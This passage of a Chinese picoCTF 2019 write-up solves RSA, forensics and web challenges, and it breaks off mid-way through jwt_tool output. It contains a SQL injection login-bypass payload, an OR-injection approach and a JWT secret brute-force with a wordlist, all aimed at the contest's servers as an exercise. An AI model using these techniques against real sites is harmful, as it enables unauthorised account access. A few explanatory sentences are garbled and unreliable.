+<p>第二题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">p : 54269</span><br><span class="line">n : 5051846941</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">q</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">q: 93089</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure></p>
+<p>第三题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">e : 3</span><br><span class="line">n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">q</span><br><span class="line">p</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):n</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure></p>
+<p>第四题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">q : 66347</span><br><span class="line">p : 12611</span><br><span class="line">##### PRODUCE THE FOLLOWING ####</span><br><span class="line">totient(n)</span><br><span class="line">IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">totient(n): 836623060</span><br><span class="line">Outstanding move!!!</span><br></pre></td></tr></table></figure></p>
+<p>第五题</p>
+<blockquote>
+<p>Using the formula: c=plaintext^e mod n.</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">	plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717</span><br><span class="line">	e : 3</span><br><span class="line">	n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331</span><br><span class="line">	##### PRODUCE THE FOLLOWING ####</span><br><span class="line">	ciphertext</span><br><span class="line">	IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">	#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">	ciphertext: 256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813</span><br><span class="line">	Outstanding move!!!</span><br></pre></td></tr></table></figure>
+<p>第六题</p>
+<blockquote>
+<p>This operation cannot be performed because p and q are not there</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">	ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323</span><br><span class="line">	e : 3</span><br><span class="line">	n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359</span><br><span class="line">	##### PRODUCE THE FOLLOWING ####</span><br><span class="line">	plaintext</span><br><span class="line">	IS THIS POSSIBLE and FEASIBLE? (Y/N):n</span><br><span class="line">	Outstanding move!!!</span><br></pre></td></tr></table></figure>
+<p>第七题</p>
+<blockquote>
+<p>For this we need to use the formula d=e^-1 mod ((p-1)(q-1)).Type (from Crypto.Util.number import *) in python.<br>Now type inverse(e,((p-1)(q-1))) by this you will get the mod.</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">	q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559</span><br><span class="line">	p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637</span><br><span class="line">	e : 65537</span><br><span class="line">	##### PRODUCE THE FOLLOWING ####</span><br><span class="line">	d</span><br><span class="line">	IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">	#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">	d: 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729</span><br><span class="line">	Outstanding move!!!</span><br></pre></td></tr></table></figure>
+<p>第八题</p>
+<blockquote>
+<p>First find ‘q’, then find and then find ‘d’ using the formula:d=e^-1 mod toitent(n). After finding d use the formula m=cyphertext^d mod n or you can also use pow(cyphertext,d,n).</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#### NEW PROBLEM ####</span><br><span class="line">	p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433</span><br><span class="line">	ciphertext : 3001133423508155019342391181454969453683740998389305521868482065953685989583037773702319581717484580966593370778920602258110457396723632087223210560766860657023257472172328220084386229851941678615818536289364033769762938914666434052719653085203028823631950908006150453932488069330802006070658787154818367594933024991778763357876382724018717890178006250599003585272226771381223645294365192346693302207328966906968620673419237444014642963102675933287390856161621142811266283239380789957372689818205738309791091491858305530388074249507780688913259911773093289575133704279048285836964311807507701403508531667913455534667</span><br><span class="line">	e : 65537</span><br><span class="line">	n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239</span><br><span class="line">	##### PRODUCE THE FOLLOWING ####</span><br><span class="line">	plaintext</span><br><span class="line">	IS THIS POSSIBLE and FEASIBLE? (Y/N):y</span><br><span class="line">	#### TIME TO SHOW ME WHAT YOU GOT! ###</span><br><span class="line">	plaintext: 14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893</span><br><span class="line">	Outstanding move!!!</span><br><span class="line">If you convert the last plaintext to a hex number, then ascii, you&apos;ll find what you need! ;)</span><br></pre></td></tr></table></figure>
+<p>最后步骤<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.15+ (default, Oct  7 2019, 17:39:04) </span><br><span class="line">[GCC 7.4.0] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; hex(14311663942709674867122208214901970650496788151239520971623411712977119642137567031494784893)</span><br><span class="line"><span class="string">'0x7069636f4354467b7741385f74683474245f696c6c336147616c2e2e6f31383238643335377dL'</span></span><br><span class="line">&gt;&gt;&gt; <span class="string">'7069636f4354467b7741385f74683474245f696c6c336147616c2e2e6f31383238643335377d'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'picoCTF&#123;wA8_th4t$_ill3aGal..o1828d357&#125;'</span></span><br></pre></td></tr></table></figure></p>
+<p><code>picoCTF{wA8_th4t$_ill3aGal..o1828d357}</code></p>
+<h2 id="miniRSA-Points-300"><a href="#miniRSA-Points-300" class="headerlink" title="miniRSA - Points: 300"></a>miniRSA - Points: 300</h2><blockquote>
+<p>Lets decrypt this: ciphertext? Something seems a bit small<br>Hints: RSA tutorial<a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/RSA_(cryptosystem)</a>)<br>How could having too small an e affect the security of this 2048 bit key?<br>Make sure you dont lose precision, the numbers are pretty big (besides the e value)</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N: 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673</span><br><span class="line">e: 3</span><br><span class="line"></span><br><span class="line">ciphertext (c): 2205316413931134031074603746928247799030155221252519872649604243394069216326314270624430181767863085854215545736160599718939066687544261205735290002239045830806570632200667142910415788763317978137702614731825117431700919216297401306846053</span><br></pre></td></tr></table></figure>
+<p>e为3时最常见的指数是65537,直接调用gmpy2库解密<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.15+ (default, Oct  7 2019, 17:39:04) </span><br><span class="line">[GCC 7.4.0] on linux2</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import gmpy2</span><br><span class="line">&gt;&gt;&gt; from gmpy2 import mpz</span><br><span class="line">&gt;&gt;&gt; x=2205316413931134031074603746928247799030155221252519872649604243394069216326314270624430181767863085854215545736160599718939066687544261205735290002239045830806570632200667142910415788763317978137702614731825117431700919216297401306846053</span><br><span class="line">&gt;&gt;&gt; gmpy2.iroot(x,3)</span><br><span class="line">(mpz(13016382529449106065894479374027604750406953699090365388202785764091466430362237L), True)</span><br><span class="line">&gt;&gt;&gt; hex(13016382529449106065894479374027604750406953699090365388202785764091466430362237)</span><br><span class="line"><span class="string">'0x7069636f4354467b6e3333645f615f6c41726733725f655f31646365613061327dL'</span></span><br><span class="line">&gt;&gt;&gt; <span class="string">'7069636f4354467b6e3333645f615f6c41726733725f655f31646365613061327d'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">'picoCTF&#123;n33d_a_lArg3r_e_1dcea0a2&#125;'</span></span><br></pre></td></tr></table></figure></p>
+<p>picoCTF{n33d_a_lArg3r_e_1dcea0a2}</p>
+<h2 id="b00tl3gRSA2-Points-400"><a href="#b00tl3gRSA2-Points-400" class="headerlink" title="b00tl3gRSA2 - Points: 400"></a>b00tl3gRSA2 - Points: 400</h2><blockquote>
+<p>In RSA d is alot bigger than e, why dont we use d to encrypt instead of e? Connect with nc 2019shell1.picoctf.com 25894.<br>HInts: What is e generally?</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c: 2907769365419444727724175525671479981034192273204157726490522975279978593460225718961335784293417741607844791576565752988761172584273921395504823687108723176653809711169572251090119440733253837992509444186223539794384266837974042900938754540469801677256722806361322725611718921210360254805056231994475857991</span><br><span class="line">n: 104632934684607347040516088721842504035835154723230245213808635990738949032699364042811143172516764890701695806265159972897211958854001703738425521421300793289421837444580747279427459325350271662864746224966534428867373786235636261074057852584587383908394377990543646006651631195118177751615662277651780552659</span><br><span class="line">e: 55055344609365698084214364458001081971584593061566317896043105474840806238363136390928780096145202259654199584711655652614362225752191811521977900738394126069944440703568029472306324641124595496813413986093178525922575816469353968511903928979464226600653482605581664396016087501078623594868326395140317882593</span><br></pre></td></tr></table></figure>
+<p>e很大容易造成维纳攻击,解题过程:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/CTF-RSA-tool<span class="comment"># touch rsa.txt</span></span><br><span class="line">/CTF-RSA-tool<span class="comment"># vi rsa.txt //按照格式把 n e c 写入</span></span><br><span class="line">/CTF-RSA-tool<span class="comment"># python solve.py -i rsa.txt</span></span><br><span class="line">INFO: picoCTF&#123;bad_1d3a5_3468581&#125;</span><br></pre></td></tr></table></figure></p>
+<p>picoCTF{bad_1d3a5_3468581}</p>
+<h1 id="杂项-Forensics"><a href="#杂项-Forensics" class="headerlink" title="杂项(Forensics)"></a>杂项(Forensics)</h1><h2 id="WhitePages-Points-250"><a href="#WhitePages-Points-250" class="headerlink" title="WhitePages - Points: 250"></a>WhitePages - Points: 250</h2><blockquote>
+<p>I stopped using YellowPages and moved onto WhitePages… but the page they gave me is all blank!</p>
+</blockquote>
+<p>用sublime打开,替换里面的不明字符和空格成0和1,再进行转换</p>
+<figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./3.png" title="图片" data-fancybox="images"><img src="./3.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{not_all_spaces_are_created_equal_f006c045f6b402ce4bc749dc7a262380}</p>
+<h2 id="like1000-Points-250"><a href="#like1000-Points-250" class="headerlink" title="like1000 - Points: 250"></a>like1000 - Points: 250</h2><blockquote>
+<p>This .tar file got tarred alot. Also available at /problems/like1000_0_369bbdba2af17750ddf10cc415672f1c.<br>Hints: Try and script this, it’ll save you alot of time</p>
+</blockquote>
+<p>要解压1000次,并把里面的内容写入一个文件,用脚本解决</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">  tf = tarfile.open(str(i)+<span class="string">".tar"</span>)</span><br><span class="line">  tf.extractall()</span><br></pre></td></tr></table></figure>
+<p>得到最后一层的flag图片<br><figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./4.png" title="图片" data-fancybox="images"><img src="./4.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure></p>
+<p>picoCTF{l0t5_0f_TAR5}</p>
+<h2 id="shark-on-wire-2-Points-300"><a href="#shark-on-wire-2-Points-300" class="headerlink" title="shark on wire 2 - Points: 300"></a>shark on wire 2 - Points: 300</h2><blockquote>
+<p>We found this packet capture. Recover the flag that was pilfered from the network. You can also find the file in /problems/shark-on-wire-2_0_3e92bfbdb2f6d0e25b8d019453fdbf07.</p>
+</blockquote>
+<p>在观察这些流之后,发现有效负载从UDP流32开始,过滤源IP后可以看到类似的包,唯一改变的就是端口号,都减去5000后转为字符串就可以得到flag</p>
+<figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./5.png" title="图片" data-fancybox="images"><img src="./5.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>这里用的是大佬的bash脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">chr</span></span>() &#123;</span><br><span class="line">  <span class="built_in">printf</span> \\$(<span class="built_in">printf</span> <span class="string">'%03o'</span> <span class="variable">$1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> $(tshark -r ./capture.pcap -T fields -e udp.srcport -Y <span class="string">"ip.src == 10.0.0.66"</span>); <span class="keyword">do</span></span><br><span class="line">    chr $(( <span class="variable">$&#123;p&#125;</span> - 5000 ))</span><br><span class="line"><span class="keyword">done</span>; <span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+<p>picoCTF{p1LLf3r3d_data_v1a_st3g0}</p>
+<h1 id="WEB应用-Web-Exploitation"><a href="#WEB应用-Web-Exploitation" class="headerlink" title="WEB应用(Web Exploitation)"></a>WEB应用(Web Exploitation)</h1><h2 id="Irish-Name-Repo-2-Points-350"><a href="#Irish-Name-Repo-2-Points-350" class="headerlink" title="Irish-Name-Repo 2 - Points: 350"></a>Irish-Name-Repo 2 - Points: 350</h2><blockquote>
+<p>There is a website running at <a href="https://2019shell1.picoctf.com/problem/40968/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/40968/</a> (link). Someone has bypassed the login before, and now it’s being strengthened. Try to see if you can still login! or <a href="http://2019shell1.picoctf.com:40968" target="_blank" rel="noopener">http://2019shell1.picoctf.com:40968</a><br>Hints: The password is being filtered.</p>
+</blockquote>
+<p>左边的导航栏有 Admin login,进入管理员登陆页面,检查页面元素在password下面有个不显示的debug值,把debug值改成1,再进行sql注入</p>
+<figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./6.png" title="图片" data-fancybox="images"><img src="./6.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>发现反弹回来的是个sql注入查询语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL query: SELECT * FROM users WHERE name=&apos;&apos; AND password=&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>payload: <code>?username=admin&#39;--&amp;password=1&amp;debug=1</code><br>返回的mysql查询语句是: <code>SELECT * FROM users WHERE name=&#39;admin&#39;--&#39; AND password=&#39;1&#39;</code></p>
+<p>会把and后面的语句注释掉进行无密码登录</p>
+<figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./7.png" title="图片" data-fancybox="images"><img src="./7.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{m0R3_SQL_plz_daf42601}</p>
+<h2 id="Irish-Name-Repo-3-Points-400"><a href="#Irish-Name-Repo-3-Points-400" class="headerlink" title="Irish-Name-Repo 3 - Points: 400"></a>Irish-Name-Repo 3 - Points: 400</h2><blockquote>
+<p>There is a secure website running at <a href="https://2019shell1.picoctf.com/problem/47247/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47247/</a> (link) or <a href="http://2019shell1.picoctf.com:47247" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47247</a>. Try to see if you can login as admin!<br>Hints: Seems like the password is encrypted.</p>
+</blockquote>
+<p>依旧是adminlogin页面,debug改为1,尝试admin登陆</p>
+<figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./8.png" title="图片" data-fancybox="images"><img src="./8.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>是个凯撒位移13位的加密,可以构造or查询语句</p>
+<figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./9.png" title="图片" data-fancybox="images"><img src="./9.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure>
+<p>picoCTF{3v3n_m0r3_SQL_c2c37f5e}</p>
+<h2 id="JaWT-Scratchpad-Points-400"><a href="#JaWT-Scratchpad-Points-400" class="headerlink" title="JaWT Scratchpad - Points: 400"></a>JaWT Scratchpad - Points: 400</h2><blockquote>
+<p>Check the admin scratchpad! <a href="https://2019shell1.picoctf.com/problem/37903/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/37903/</a> or <a href="http://2019shell1.picoctf.com:37903" target="_blank" rel="noopener">http://2019shell1.picoctf.com:37903</a><br>Hints: What is that cookie?<br>Have you heard of JWT?</p>
+</blockquote>
+<p>我是第一次接触到JaWT和JWT,对于这道题是参考了Ch3lLIST4师傅的wp</p>
+<p>简单了解下JWT(JSON Web Token)由三部分组成，分别是头信息、有效载荷、签名，中间以（.）分隔</p>
+<p>header部分由令牌类型和散列算法组成 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>payload部分由claims构成,经过Base64Url编码，形成JWT的第二部分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>签名令牌的信息虽然可以防止篡改,但任何人都可以读取(除非加密),所以不要将敏感信息放入到Payload或Header元素中,换言之我们就可以通过在cookie中写入令牌来进行伪身份访问<br>Signature部分需要用到编码的Header,编码的Payload,秘钥,Header中指定的算法,并对其进行签名,在经过base64-url编码后会形成由三个.结束的base64字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
+<p>我以Damya的用户名登陆jwt,在cookie里发现了名为jwt的签名令牌<br><figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./10.png" title="图片" data-fancybox="images"><img src="./10.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiRGFteWEifQ.ciYsP6qbAYf8PrvRIJsJRAUoz_By7XQBUwipfyAJ0vU</span><br></pre></td></tr></table></figure>
+<p>初步解码可以得到header和payload部分,于是使用jwttool工具爆剩下的信息,因为页面提示了john,可能是要使用john的字典…然后在师傅的页面看到是kali的rockyou.txt,我正好有就不下john了,太大了<br><figure class="image-box">
+                <a rel=2019picoCTF补充wp(10050分记录) href="./11.png" title="图片" data-fancybox="images"><img src="./11.png" alt="图片" title class></a>
+                <p>图片</p>
+            </figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">root@iZ2ze5rmf8lyj1geahh44hZ:~/jwt_tool<span class="comment"># python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiRGFteWEifQ.ciYsP6qbAYf8PrvRIJsJRAUoz_By7XQBUwipfyAJ0vU -d ~/wordlists/rockyou.txt</span></span><br><span class="line"></span><br><span class="line">   $$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$$$\                  $$\ </span><br><span class="line">   \__$$ |$$ | $\  $$ |\__$$  __| \__$$  __|                 $$ |</span><br><span class="line">      $$ |$$ |$$$\ $$ |   $$ |       $$ | $$$$$$\   $$$$$$\  $$ |</span><br><span class="line">      $$ |$$ $$ $$\$$ |   $$ |       $$ |$$  __$$\ $$  __$$\ $$ |</span><br><span class="line">$$\   $$ |$$$$  _$$$$ |   $$ |       $$ |$$ /  $$ |$$ /  $$ |$$ |</span><br><span class="line">$$ |  $$ |$$$  / \$$$ |   $$ |       $$ |$$ |  $$ |$$ |  $$ |$$ |</span><br><span class="line">\$$$$$$  |$$  /   \$$ |   $$ |       $$ |\$$$$$$  |\$$$$$$  |$$ |</span><br><span class="line"> \______/ \__/     \__|   \__|$$$$$$\__| \______/  \______/ \__|</span><br><span class="line"> Version 1.3.2                \______|                           </span><br><span class="line"></span><br><span class="line">=====================</span><br><span class="line">Decoded Token Values:</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">Token header values:</span><br><span class="line">[+] typ = JWT</span><br><span class="line">[+] alg = HS256</span><br><span class="line"></span><br><span class="line">Token payload values:</span><br><span class="line">[+] user = Damya</span><br><span class="line"></span><br><span class="line">----------------------</span><br><span class="line">JWT common timestamps:</span><br><span class="line">iat = IssuedAt</span><br><span class="line">exp = Expires</span><br><span class="line">nbf = NotBefore</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">########################################################</span></span><br><span class="line"><span class="comment">#  Options:                                            #</span></span><br><span class="line"><span class="comment">#                ==== TAMPERING ====                   #</span></span><br><span class="line"><span class="comment">#  1: 